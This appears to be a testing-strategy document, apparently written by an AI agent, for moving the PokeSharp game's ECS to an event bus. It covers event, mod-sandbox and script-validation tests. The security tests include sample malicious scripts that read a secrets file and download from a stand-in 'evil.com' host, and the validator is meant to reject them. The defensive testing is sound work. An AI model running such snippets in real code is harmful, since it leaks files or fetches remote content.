# Event-Driven ECS Architecture - Comprehensive Testing Strategy

**Version:** 1.0
**Date:** 2025-12-02
**Author:** Integration-Tester Agent (Hive Mind)
**Status:** Active Development

---

## Executive Summary

This document outlines the comprehensive testing strategy for migrating PokeSharp's ECS architecture from tightly-coupled direct system calls to an event-driven, publisher-subscriber model. The strategy ensures reliability, performance, and safety during the transition while enabling modding and scripting capabilities.

## Table of Contents

1. [Testing Objectives](#testing-objectives)
2. [Test Pyramid Strategy](#test-pyramid-strategy)
3. [Test Categories](#test-categories)
4. [Event System Testing](#event-system-testing)
5. [Integration Testing](#integration-testing)
6. [Performance Testing](#performance-testing)
7. [Mod System Testing](#mod-system-testing)
8. [Script Validation Testing](#script-validation-testing)
9. [Migration Regression Testing](#migration-regression-testing)
10. [Test Data and Fixtures](#test-data-and-fixtures)
11. [Continuous Integration](#continuous-integration)
12. [Success Metrics](#success-metrics)

---

## 1. Testing Objectives

### Primary Goals

1. **Event System Reliability**: Ensure event dispatch, subscription, and handler execution are 100% reliable
2. **Performance Validation**: Verify event-driven architecture meets or exceeds current performance (60fps target)
3. **Decoupling Verification**: Prove systems can operate independently through events
4. **Mod Safety**: Validate mod isolation, sandboxing, and error handling
5. **Script Security**: Ensure script validation prevents malicious code execution
6. **Migration Safety**: Prevent regressions during transition from direct calls to events
7. **Developer Experience**: Provide clear testing examples for mod developers

### Critical Requirements

- **Zero-tolerance for event loss**: 100% delivery guarantee for critical events
- **Performance baseline**: No more than 5% performance degradation
- **Backward compatibility**: Existing systems continue working during migration
- **Mod isolation**: Mods cannot crash the game or access restricted systems
- **Script sandboxing**: Scripts cannot escape sandbox or access file system

---

## 2. Test Pyramid Strategy

```
                    /\
                   /  \
                  / E2E\          <- 10% (Full game scenarios)
                 /------\
                /        \
               /Integration\      <- 30% (System interactions)
              /------------\
             /              \
            /  Unit Tests    \    <- 60% (Event components)
           /------------------\
```

### Rationale

- **Unit Tests (60%)**: Fast, isolated, reliable - test event infrastructure components
- **Integration Tests (30%)**: Verify system interactions through events
- **E2E Tests (10%)**: Full gameplay scenarios with mods and scripts

### Test Execution Time Targets

- **Unit Tests**: < 5 seconds total
- **Integration Tests**: < 30 seconds total
- **Performance Tests**: < 2 minutes total
- **Full Suite**: < 5 minutes total

---

## 3. Test Categories

### 3.1 Unit Tests (`/tests/ecs-events/unit/`)

Test individual event system components in isolation.

**Components to Test:**
- Event definitions and types
- Event publisher/dispatcher
- Event subscription management
- Event handler registration
- Event priority queuing
- Event filtering
- Memory management (pooling, allocations)

### 3.2 Integration Tests (`/tests/ecs-events/integration/`)

Test system interactions through events.

**Scenarios:**
- Cross-system event communication
- Event chains and cascading
- System startup/shutdown coordination
- Resource sharing through events
- Error propagation across systems

### 3.3 Performance Tests (`/tests/ecs-events/performance/`)

Validate performance characteristics and prevent regressions.

**Benchmarks:**
- Event dispatch latency
- Throughput (events/second)
- Memory allocations per frame
- CPU profiling
- Frame time budgets

### 3.4 Mod System Tests (`/tests/ecs-events/mods/`)

Validate mod loading, execution, and isolation.

**Coverage:**
- Mod discovery and loading
- Mod dependency resolution
- Mod lifecycle (init, update, shutdown)
- Mod isolation and sandboxing
- Mod error handling and recovery

### 3.5 Script Tests (`/tests/ecs-events/scripts/`)

Ensure script compilation, validation, and execution safety.

**Testing:**
- Script compilation (Roslyn)
- Syntax validation
- Security validation (no file I/O, no reflection)
- Execution sandboxing
- Error handling

### 3.6 Migration Tests (`/tests/ecs-events/migration/`)

Prevent regressions during transition from direct calls to events.

**Validation:**
- Behavior equivalence tests
- Performance comparison tests
- Feature parity verification
- Backward compatibility tests

---

## 4. Event System Testing

### 4.1 Event Publishing

**Unit Tests:**
```csharp
[Test]
public void PublishEvent_WhenCalled_DispatchesToAllSubscribers()
[Test]
public void PublishEvent_WithNoSubscribers_DoesNotThrow()
[Test]
public void PublishEvent_WithNullEvent_ThrowsArgumentNullException()
[Test]
public void PublishEvent_InOrder_MaintainsEventSequence()
```

### 4.2 Event Subscription

**Unit Tests:**
```csharp
[Test]
public void Subscribe_WhenCalled_RegistersHandler()
[Test]
public void Subscribe_SameHandlerTwice_OnlyRegistersOnce()
[Test]
public void Unsubscribe_WhenCalled_RemovesHandler()
[Test]
public void Unsubscribe_NonExistentHandler_DoesNotThrow()
[Test]
public void Subscribe_WithPriority_OrdersHandlersByPriority()
```

### 4.3 Event Dispatch

**Integration Tests:**
```csharp
[Test]
public void EventDispatch_WithMultipleSystems_ExecutesInPriorityOrder()
[Test]
public void EventDispatch_WhenHandlerThrows_ContinuesExecutingOtherHandlers()
[Test]
public void EventDispatch_WithFilter_OnlyDispatchesToMatchingHandlers()
[Test]
public void EventDispatch_WithCancellation_StopsPropagation()
```

### 4.4 Event Performance

**Performance Tests:**
```csharp
[Benchmark]
public void Dispatch_1000Events_MeasuresLatency()
[Benchmark]
public void Dispatch_WithPooling_MeasuresAllocation()
[Benchmark]
public void Subscribe_100Handlers_MeasuresRegistrationTime()
```

---

## 5. Integration Testing

### 5.1 System Decoupling

**Test Scenario: Movement System → Collision System via Events**

**Before (Direct Call - Baseline):**
```csharp
// Movement system directly calls collision
collisionSystem.CheckCollision(entity, newPosition);
```

**After (Event-Driven - Test):**
```csharp
// Movement publishes event
eventBus.Publish(new CollisionCheckEvent(entity, newPosition));
// Collision system subscribes and handles
```

**Test:**
```csharp
[Test]
public void MovementSystem_PublishesCollisionCheckEvent_CollisionSystemHandles()
{
    // Arrange
    var movementSystem = CreateMovementSystem();
    var collisionSystem = CreateCollisionSystem();
    var eventBus = CreateEventBus();

    // Act
    movementSystem.Update(world, deltaTime);

    // Assert
    Assert.That(collisionSystem.HandledEvents.Count, Is.EqualTo(expectedCount));
    Assert.That(collisionSystem.HandledEvents[0].Type, Is.EqualTo(EventType.CollisionCheck));
}
```

### 5.2 Event Chains

**Test Scenario: Player Input → Movement → Collision → Position Update**

```csharp
[Test]
public void EventChain_PlayerInput_TriggersCompleteMovementSequence()
{
    // Input → MoveCommand event
    // MoveCommand → CollisionCheck event
    // CollisionCheck → PositionUpdate event

    var eventLog = new List<IEvent>();
    eventBus.SubscribeToAll(evt => eventLog.Add(evt));

    inputSystem.ProcessInput(Keys.Up);

    AssertEventSequence(eventLog,
        typeof(MoveCommandEvent),
        typeof(CollisionCheckEvent),
        typeof(PositionUpdateEvent)
    );
}
```

### 5.3 Cross-System Communication

**Test all system pairs that need to communicate:**
- Movement ↔ Collision
- Collision ↔ Warp
- Player ↔ NPC (pathfinding)
- Tile ↔ Script execution
- Animation ↔ Rendering

---

## 6. Performance Testing

### 6.1 Baseline Measurements

**Current Performance (Direct Calls):**
- Update loop: ~1-2ms @ 60fps
- Collision checks: ~0.5ms per frame
- System execution: ~3-5ms total per frame
- Frame budget: 16.67ms (60fps)

### 6.2 Event System Benchmarks

```csharp
[Benchmark(Description = "Event dispatch overhead")]
public void Benchmark_EventDispatch_Overhead()
{
    // Measure: Time to dispatch 1000 events
    // Target: < 0.1ms per event
}

[Benchmark(Description = "Event vs Direct Call")]
public void Benchmark_EventVsDirectCall_Comparison()
{
    // Baseline: Direct method call
    // Test: Event dispatch + handler execution
    // Target: < 10% overhead
}

[Benchmark(Description = "Memory allocations")]
public void Benchmark_EventDispatch_Allocations()
{
    // Measure: Bytes allocated per frame
    // Target: < 1KB per frame with pooling
}
```

### 6.3 Performance Regression Tests

```csharp
[Test]
public void Performance_EventArchitecture_DoesNotDegradeFrameTime()
{
    var baseline = MeasureFrameTime(directCallSystem);
    var eventDriven = MeasureFrameTime(eventDrivenSystem);

    var degradation = (eventDriven - baseline) / baseline;
    Assert.That(degradation, Is.LessThan(0.05)); // < 5% degradation
}
```

### 6.4 Stress Testing

```csharp
[Test]
public void StressTest_1000Events_PerFrame_MaintainsFrameRate()
{
    // Simulate heavy event load
    for (int i = 0; i < 1000; i++) {
        eventBus.Publish(new StressTestEvent());
    }

    Assert.That(frameTime, Is.LessThan(16.67)); // 60fps maintained
}
```

---

## 7. Mod System Testing

### 7.1 Mod Loading

```csharp
[Test]
public void ModLoader_LoadValidMod_SuccessfullyRegisters()
[Test]
public void ModLoader_LoadInvalidMod_LogsErrorAndContinues()
[Test]
public void ModLoader_ResolveDependencies_LoadsInCorrectOrder()
[Test]
public void ModLoader_CircularDependency_DetectsAndRejects()
```

### 7.2 Mod Isolation

```csharp
[Test]
public void Mod_CannotAccessFileSystem()
{
    var mod = LoadTestMod("evil-mod-filesystem.dll");

    Assert.Throws<SecurityException>(() =>
        mod.Execute(new ModContext())
    );
}

[Test]
public void Mod_CannotAccessOtherModData()
{
    var mod1 = LoadTestMod("mod1.dll");
    var mod2 = LoadTestMod("mod2.dll");

    // Mod2 tries to access Mod1's state
    Assert.That(mod2.TryGetState("mod1-data"), Is.Null);
}

[Test]
public void Mod_CrashDoesNotCrashGame()
{
    var crashingMod = LoadTestMod("crashing-mod.dll");

    Assert.DoesNotThrow(() =>
        modRunner.ExecuteAllMods()
    );
    Assert.That(game.IsRunning, Is.True);
}
```

### 7.3 Mod Events

```csharp
[Test]
public void Mod_CanSubscribeToGameEvents()
{
    var mod = CreateTestMod();
    mod.SubscribeToEvent<PlayerMoveEvent>();

    eventBus.Publish(new PlayerMoveEvent());

    Assert.That(mod.HandledEvents.Count, Is.EqualTo(1));
}

[Test]
public void Mod_CanPublishCustomEvents()
{
    var mod = CreateTestMod();
    var eventHandled = false;

    eventBus.Subscribe<CustomModEvent>(evt => eventHandled = true);
    mod.PublishEvent(new CustomModEvent());

    Assert.That(eventHandled, Is.True);
}
```

---

## 8. Script Validation Testing

### 8.1 Compilation Tests

```csharp
[Test]
public void ScriptCompiler_ValidScript_CompilesSuccessfully()
{
    var script = @"
        public class TestBehavior : TileBehaviorScriptBase {
            public override bool IsBlockedFrom(ScriptContext ctx, Direction from, Direction to) {
                return true;
            }
        }
        return new TestBehavior();
    ";

    var compiled = scriptCompiler.Compile(script, "test.csx");
    Assert.That(compiled, Is.Not.Null);
}

[Test]
public void ScriptCompiler_SyntaxError_ReturnsNull()
{
    var invalidScript = "public class { // invalid syntax";
    var compiled = scriptCompiler.Compile(invalidScript, "invalid.csx");

    Assert.That(compiled, Is.Null);
}
```

### 8.2 Security Validation

```csharp
[Test]
public void ScriptValidator_FileAccess_Rejected()
{
    var maliciousScript = @"
        System.IO.File.ReadAllText(""C:/secrets.txt"");
    ";

    Assert.That(
        () => scriptValidator.Validate(maliciousScript),
        Throws.TypeOf<SecurityException>()
    );
}

[Test]
public void ScriptValidator_ReflectionAccess_Rejected()
{
    var reflectionScript = @"
        typeof(Game).GetField(""privateField"", BindingFlags.NonPublic);
    ";

    Assert.That(
        () => scriptValidator.Validate(reflectionScript),
        Throws.TypeOf<SecurityException>()
    );
}

[Test]
public void ScriptValidator_NetworkAccess_Rejected()
{
    var networkScript = @"
        new System.Net.WebClient().DownloadString(""http://evil.com"");
    ";

    Assert.That(
        () => scriptValidator.Validate(networkScript),
        Throws.TypeOf<SecurityException>()
    );
}
```

### 8.3 Script Execution

```csharp
[Test]
public void ScriptExecution_ValidScript_ExecutesCorrectly()
{
    var script = LoadTestScript("test-behavior.csx");
    var context = new ScriptContext(world, entity);

    var result = script.IsBlockedFrom(context, Direction.Up, Direction.Up);

    Assert.That(result, Is.True);
}

[Test]
public void ScriptExecution_Timeout_TerminatesExecution()
{
    var infiniteLoopScript = LoadTestScript("infinite-loop.csx");

    Assert.That(
        () => scriptExecutor.Execute(infiniteLoopScript, timeout: 100ms),
        Throws.TypeOf<TimeoutException>()
    );
}
```

---

## 9. Migration Regression Testing

### 9.1 Behavior Equivalence

```csharp
[Test]
public void Migration_CollisionSystem_BehaviorEquivalent()
{
    // Test old direct-call implementation
    var oldResult = oldCollisionSystem.CheckCollision(entity, newPos);

    // Test new event-driven implementation
    eventBus.Publish(new CollisionCheckEvent(entity, newPos));
    var newResult = collisionEventHandler.LastResult;

    Assert.That(newResult, Is.EqualTo(oldResult));
}
```

### 9.2 Feature Parity

**Test Checklist:**
- [ ] All existing systems work with events
- [ ] No features lost during migration
- [ ] All edge cases still handled
- [ ] Error handling preserved
- [ ] Performance maintained

### 9.3 Backward Compatibility

```csharp
[Test]
public void Migration_HybridMode_BothApproachesWork()
{
    // Some systems use events, some use direct calls
    // Game should work during transition

    var oldStyleSystem = new OldCollisionSystem();
    var newStyleSystem = new EventDrivenMovementSystem();

    systemManager.RegisterUpdateSystem(oldStyleSystem);
    systemManager.RegisterUpdateSystem(newStyleSystem);

    Assert.DoesNotThrow(() =>
        systemManager.Update(world, deltaTime)
    );
}
```

---

## 10. Test Data and Fixtures

### 10.1 Test Worlds

```csharp
public static class TestWorldFactory
{
    public static World CreateMinimalWorld()
    {
        // Single entity, no systems
    }

    public static World CreateStandardWorld()
    {
        // 100 entities, basic systems
    }

    public static World CreateStressTestWorld()
    {
        // 10,000 entities, all systems
    }
}
```

### 10.2 Mock Events

```csharp
public class MockEvent : IEvent
{
    public Guid EventId { get; set; }
    public DateTime Timestamp { get; set; }
    public object Sender { get; set; }
}

public class MockEventHandler : IEventHandler<MockEvent>
{
    public List<MockEvent> HandledEvents { get; } = new();

    public void Handle(MockEvent evt)
    {
        HandledEvents.Add(evt);
    }
}
```

### 10.3 Test Mods

Create sample mods for testing:
- `test-mod-valid/` - Well-formed mod with proper manifest
- `test-mod-invalid/` - Invalid mod for error testing
- `test-mod-dependency/` - Mod with dependencies
- `test-mod-malicious/` - Attempts security violations

---

## 11. Continuous Integration

### 11.1 CI Pipeline

```yaml
# .github/workflows/test-event-system.yml
name: Event System Tests

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Setup .NET
        uses: actions/setup-dotnet@v1
      - name: Run Unit Tests
        run: dotnet test tests/ecs-events/unit/
      - name: Upload Coverage
        uses: codecov/codecov-action@v1

  integration-tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run Integration Tests
        run: dotnet test tests/ecs-events/integration/

  performance-tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run Benchmarks
        run: dotnet run --project tests/ecs-events/performance/
      - name: Compare with Baseline
        run: ./scripts/compare-performance.sh
```

### 11.2 Test Coverage Requirements

- **Unit Tests**: 80% coverage minimum
- **Integration Tests**: 70% coverage minimum
- **Critical Paths**: 100% coverage required
  - Event dispatch
  - Mod loading
  - Script validation
  - Security checks

---

## 12. Success Metrics

### 12.1 Quantitative Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Event Delivery Rate | 100% | No dropped events in 1M dispatches |
| Frame Time | < 16.67ms | 60fps maintained with events |
| Performance Overhead | < 5% | Event vs direct call comparison |
| Test Coverage | > 80% | Line/branch coverage |
| Test Execution Time | < 5 min | Full suite completion |
| Mod Isolation | 100% | No sandbox escapes |
| Script Validation | 100% | All malicious scripts blocked |

### 12.2 Qualitative Metrics

- **Code Quality**: Clean, maintainable test code
- **Documentation**: Comprehensive test documentation
- **Developer Experience**: Easy to write new tests
- **Mod Developer Experience**: Clear examples and guides
- **Debugging**: Tests help identify issues quickly

### 12.3 Regression Prevention

Track regressions over time:
```bash
# Baseline before migration
dotnet run --project PerformanceBenchmarks > baseline.txt

# After each major change
dotnet run --project PerformanceBenchmarks > current.txt
./scripts/compare-performance.sh baseline.txt current.txt
```

---

## Appendix A: Test Execution Order

1. **Unit Tests** - Fast feedback
2. **Integration Tests** - System interactions
3. **Performance Tests** - Benchmark validation
4. **Migration Tests** - Regression prevention
5. **E2E Tests** - Full scenarios

## Appendix B: Test Naming Conventions

```csharp
// Pattern: [MethodName]_[Scenario]_[ExpectedBehavior]
PublishEvent_WhenCalled_DispatchesToAllSubscribers()
Subscribe_SameHandlerTwice_OnlyRegistersOnce()
ModLoader_LoadInvalidMod_LogsErrorAndContinues()
```

## Appendix C: Tools and Frameworks

- **Test Framework**: NUnit
- **Mocking**: NSubstitute
- **Benchmarking**: BenchmarkDotNet
- **Coverage**: Coverlet
- **CI/CD**: GitHub Actions

---

**Document Version History:**
- v1.0 (2025-12-02): Initial comprehensive testing strategy
